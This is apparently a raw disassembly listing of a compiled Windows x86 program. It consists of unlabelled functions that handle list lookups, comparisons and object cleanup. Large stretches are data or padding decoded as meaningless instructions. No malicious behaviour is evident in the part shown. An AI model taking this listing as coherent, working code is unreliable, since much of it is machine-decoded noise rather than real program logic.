add [ eax ] al
movsb [ edi ] [ esi ]
inc cx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
jb r-xdata
jae r-xdata
inc ecx
add [ ebp * 4 - 0x59f3ffbf ] bl
inc ecx
add [ eax - 0x53 ] bl
inc ecx
add ah cl
lodsd [ esi ]
inc ecx
add al dh
cmpsd [ esi ] [ edi ]
inc ecx
add ah bh
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x67 ] al
inc ecx
add [ eax - 0x27ffbe58 ] bl
test al 0x41
add [ ecx + ebp * 4 + 0x41 ] al
add [ esi + ebx * 4 + 0x41 ] ch
add ah dl
stosb [ edi ]
inc ecx
add [ eax ] al
mov eax [ 0xffffffffa1d40041 ]
inc ecx
add [ eax ] dl
stosd [ edi ]
inc ecx
add [ eax ] ah
stosd [ edi ]
inc ecx
add [ eax ] bh
mov [ 0xffffffffa28c0041 ] al
inc ecx
add [ eax ] bh
mov [ 0xffffffffa4d00041 ] eax
inc ecx
add [ eax ] ch
movsd [ edi ] [ esi ]
inc ecx
add [ ebp - 0x579fffbf ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] bh
add [ ebx + ebp * 4 + 0x41 ] dh
add ah al
test eax 0xad840041
inc ecx
add [ ebp + ebp * 4 + 0x540b0041 ] dl
push ebx
je r-xdata
lodsb [ esi ]
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ edi - 0x7207ffbf ] dl
inc ecx
add [ eax ] al
insd
dec ebp
popad
insd
fsub [ edi + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
inc ecx
add [ eax ] dl
add [ eax ] al
add [ esi ] dh
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x1c0041b4 ] bl
scasb [ edi ]
inc ecx
add ah al
mov dl 0x41
add al bl
mov dl 0x41
add [ eax - 0x4e ] bh
inc ecx
add [ eax + 0x200041b2 ] cl
scasd [ edi ]
inc ecx
add [ eax + 0xb0041b2 ] bl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
add [ eax + 0xd0041b2 ] bl
push esp
dec eax
popad
outsb
insb
insd
popad
add [ ebp + 0x66800040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x40041 ] bl
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
jns r-xdata
push ebx
je r-xdata
insd
outsd
jb r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
sbb al 0xae
inc ecx
add [ eax - 0x52 ] ch
inc ecx
add [ eax - 0x2bffbe52 ] al
mov ah 0x41
add [ ecx + ebp + 0x40 ] bl
add [ esi * 4 - 0x505bffbf ] cl
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
inc cx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
inc ecx
add [ eax ] cl
add [ eax ] al
add [ esi ] dh
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
sbb al 0xae
je r-xdata
insd
popad
insd
pop eax
push 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
outsd
jb r-xdata
movsb [ edi ] [ esi ]
scasd [ edi ]
inc ecx
add [ eax ] al
mov dh 0x41
je r-xdata
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
sbb al 0xae
inc ecx
add ah al
mov dl 0x41
add al bl
mov dl 0x41
add [ eax - 0x4e ] bh
inc ecx
add [ eax + 0x200041b2 ] cl
scasd [ edi ]
inc ecx
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
popad
insd
mov eax eax
aam 0x68
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
push 0x180041
add [ eax ] al
nop
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
push ebx
push ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax + eax ] dl
add [ eax ] al
nop
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ 0x6d654d54 ] cl
inc ecx
add [ edi + ebp * 4 - 0x49ffffbf ] ah
inc ecx
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
inc ecx
add [ eax - 0x52 ] ch
inc ecx
add [ eax - 0x2bffbe52 ] al
mov ah 0x41
add [ eax - 0x48 ] cl
inc ecx
add [ esi * 4 - 0x505bffbf ] cl
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] dl
mov eax 0xae1c0041
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] dh
mov ch 0x41
add [ esi + ebp * 4 ] bl
inc ecx
add ah dl
mov ch 0x41
add [ eax - 0x2bffbe52 ] al
mov ah 0x41
add [ esi + esi * 4 - 0x4af3ffbf ] cl
sub_416a18
imul eax [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
imul eax [ ecx ] 0x0
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 2 + 0x41 ] dl
add [ eax ] ch
add [ eax ] al
add [ eax + 0x70004010 ] dh
xor eax [ eax ]
jb r-xdata
rol [ ecx ] 0x1
push cs
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x41 ] ch
inc ecx
add al dl
mov eax 0xbfc80041
inc ecx
add ah bh
mov edi 0xc3100041
inc ecx
add ah ch
rol [ ecx ] 0x18
loop r-xdata
imul eax [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x2fffbe48 ] ch
mov eax 0x295c0041
inc eax
add [ ecx + ebp + 0x40 ] bl
add [ ecx + ebp + 0x40 ] bl
add [ esi ] al
push esp
inc esi
imul ebp [ ebp + 0x72 ] 0x416ba890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edx + 0x41 ] gs
add [ eax ] bl
add [ eax ] al
add [ ecx + edx + 0x33700040 ] ah
inc eax
add [ eax + ebx * 2 ] dh
inc eax
add [ eax + 0x58 ] al
inc eax
add [ ebx + esi + 0x33780040 ] al
inc eax
add [ eax + 0x58 ] dl
inc eax
add ah bl
xor [ eax ] al
mov [ eax ] ds
inc edx
add ah al
sbb [ edx ] al
sub al 0x19
inc edx
add [ ecx + ebx + 0x1a180042 ] dl
inc edx
add [ edx + ebx + 0x42 ] bh
add [ esp + ebx + 0x42 ] bh
add [ eax - 0x6bffbde4 ] cl
sbb al 0x42
add [ eax - 0x53ffbde4 ] ah
sbb al 0x42
add [ eax ] ch
sbb eax 0x540e0042
push ebx
je r-xdata
call sub_41ac0b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
push 0x41
add [ eax ] cl
add [ eax ] al
add [ eax + 0x70004010 ] dh
xor eax [ eax ]
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
loop r-xdata
sar [ eax ] 0x6c
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 2 + 0x41 ] cl
inc ecx
add [ eax + eax ] cl
add al bh
push 0x41
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 8 ] cl
inc ecx
add al ch
loop r-xdata
add [ eax ] al
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
jb r-xdata
add al bh
push 0x41
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc ecx
add [ eax + eax ] bh
add [ edi ] al
push esp
push edi
jb r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ edi - 0x1783ffbf ] bl
inc ecx
add ah dl
out 0x41 eax
add ah bh
out 0x41 eax
add [ eax ] bh
call 0xffffffffec696c8b
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2c0040 ] dl
add [ eax ] al
pop es
add [ eax ] al
add [ eax ] al
add al dl
loop r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah dl
jpe r-xdata
dec esi
je r-xdata
pop esi
insb
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x700040 ] dl
add [ eax ] al
pop es
push esp
push edx
popad
jb r-xdata
add [ eax + edx * 8 + 0x41 ] cl
add [ esi ] cl
jl r-xdata
add [ esp + edx * 2 ] cl
inc ebx
insb
popad
jae r-xdata
inc esp
and al 0x4
aam 0xe9
out 0xa7 eax
add [ eax ] al
int3
jns r-xdata
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl ah
imul eax [ ecx ] 0x7c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr [ ebx + 0x41 ] 0x1
add [ eax ] al
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add [ ebx + ebp * 2 + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr al 0xe9
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e82661
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
jae r-xdata
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp sub_42151c
popad
insd
aam 0x6c
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x6c ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
insb
inc ecx
shl [ esp + ebp * 2 + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 2 + 0xc0041 ] dh
add [ eax ] al
clc
jo r-xdata
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
add [ edi ] cl
cmovns eax [ ebp + 0x73 ]
imul esp [ edi + 0x6e ] 0x6f4e7265
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
dec ebx
test al 0x0
add [ ebx - 0x27fbdbbc ] al
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
dec [ ebx - 0x3f7c3340 ]
fsubr st1
add bh bh
jae r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
pop es
inc ebp
push esp
push 0x64616572
shr [ ecx + eax * 2 ] 0xa
push cs
push esp
inc ebx
outsd
insd
jo r-xdata
add al 0xd4
jmp sub_42151c
outsb
jb r-xdata
aam 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
je r-xdata
outsb
outsb
jmp sub_42153c
je r-xdata
outsd
sub_416e60
cmp al 0x11
inc edx
add [ ecx + edx + 0x42 ] al
add [ eax + 0x11 ] cl
inc edx
add [ eax + 0x11 ] ah
inc edx
add [ ecx + edx + 0x11640042 ] dl
inc edx
add [ ecx + edx + 0x42 ] ch
add [ eax + 0x11 ] dh
inc edx
add [ ecx + edx + 0x42 ] bh
add [ eax ] ch
adc al [ edx ]
cmp al 0x12
inc edx
add [ eax + 0x14 ] bl
inc edx
add [ eax + 0x11 ] ch
inc edx
add [ ecx + edx + 0x42 ] cl
add [ eax ] bh
adc [ edx ] eax
adc [ edx + eax * 2 ] 0x0
or dl [ ebx + eax * 2 + 0x6f ]
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
outsb
outsb
je r-xdata
jo r-xdata
inc ecx
add [ eax ] al
adc [ eax ] al
std
mov al 0x6e
inc ecx
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6f ]
insd
jo r-xdata
adc al 0x8d
inc ecx
add [ eax - 0x7ffbdef ] cl
push ss
inc edx
add [ eax - 0x6fffbdef ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 2 ] ah
inc ecx
add [ eax + esi * 2 ] ch
inc ecx
add [ eax + eax ] dl
add [ eax - 0x43ffbe93 ] dh
adc al 0x42
add [ ebx + esi + 0x40 ] bh
add ah bh
or eax 0x33840042
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x7ffbdea ] bl
lea eax [ ecx ]
mov al 0x10
inc edx
add [ ecx * 4 + 0x11880041 ] dl
inc edx
imul esp [ ebx + 0x41 ] 0x6f697463
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x5bffbdeb ] ch
adc eax 0x15dc0042
inc edx
add [ esi + edx ] bh
inc edx
add [ eax ] dl
push ss
inc edx
add [ eax + 0x16 ] al
inc edx
add [ eax + 0x15 ] ah
inc edx
add ah dh
adc eax 0x16480042
inc edx
add [ eax ] dl
push esp
inc edx
popad
jae r-xdata
add [ eax + eax ] dl
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 2 + 0x41 ] bh
outsb
add al bh
arpl [ ecx + 0x63 ] ax
je r-xdata
outsb
je r-xdata
insd
inc ecx
add al ch
pop edi
inc ecx
add [ edx ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
adc al [ edx ]
aam 0x14
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ esi + edx + 0x42 ] dl
add [ eax + 0x5c004217 ] bh
pop ss
inc edx
add al dh
push ss
inc edx
add [ eax ] ah
pop ss
inc edx
add ah dh
push ss
inc edx
add [ eax + 0x17 ] al
inc edx
add [ ecx ] al
add bh ch
jmp [ edi + edx ]
cwde
adc [ edx ] eax
nop
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xdc00408d
outsd
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x70 ] al
inc ecx
outsd
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
jae r-xdata
insb
inc ecx
add [ eax ] cl
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040000 ] al
popad
insd
cmp al 0x10
inc eax
add [ eax + eax ] cl
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add edx [ ecx + 0x67 ]
lea eax [ eax ]
pop esp
outsd
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 2 + 0x80041 ] bh
add bh bh
sbb [ eax ] al
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x4e
sub_417088
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405fc8
pop edi
pop esi
pop ebx
retn
sub_4170c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405fac
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4170ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405fd0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41712c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax + 0x33 ] bh
inc ecx
add [ eax + eax ] dl
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
nop
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
jno sub_4171e4
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] dh
jae r-xdata
in al dx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
jae r-xdata
add [ eax + eax ] ah
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x76 ] bl
inc ecx
add [ edx ] cl
push esp
push edx
inc edi
jb r-xdata
xor [ ebx ] 0x40
add [ ebx + esi + 0x33780040 ] al
add [ ecx ] cl
push esp
push edx
inc edi
jb r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4171e4
mov esi eax
jmp r-xdata
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
xor [ ebx + 0x41 ] dh
and al 0x33
in eax dx
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov [ esp + 0x4 ] edx
mov [ esp ] eax
jne r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4171e4
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
xor ebp ebp
add al 0x89
add al 0x24
mov eax eax
int3
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_403354
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_418700
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403354
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403354
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4171e4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_418700
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403354
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403354
test al al
je r-xdata
sub_417244
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4171e4
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4171e4
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403354
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4172b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4030f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_4185a4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_417330
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
mov eax [ esi + 0x4 ]
call sub_403128
mov eax [ esi + 0x8 ]
call sub_403128
mov eax [ esi + 0xc ]
call sub_403128
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_417370
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_418700
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_40308c
test al al
jne r-xdata
sub_4173d0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_418700
mov edx eax
mov eax ebp
call sub_403354
test al al
jne r-xdata
sub_417414
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4174af
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403078
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40411c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_417370
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4185a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4174b6
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8f4
call sub_4038f4
sub_4174d4
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_405138
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4174f4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_418700
mov edx edi
call sub_4174d4
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_418700
mov edx edi
call sub_4174d4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4185f0
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_4174d4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4185f0
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_417598
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_418700
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_4173d0
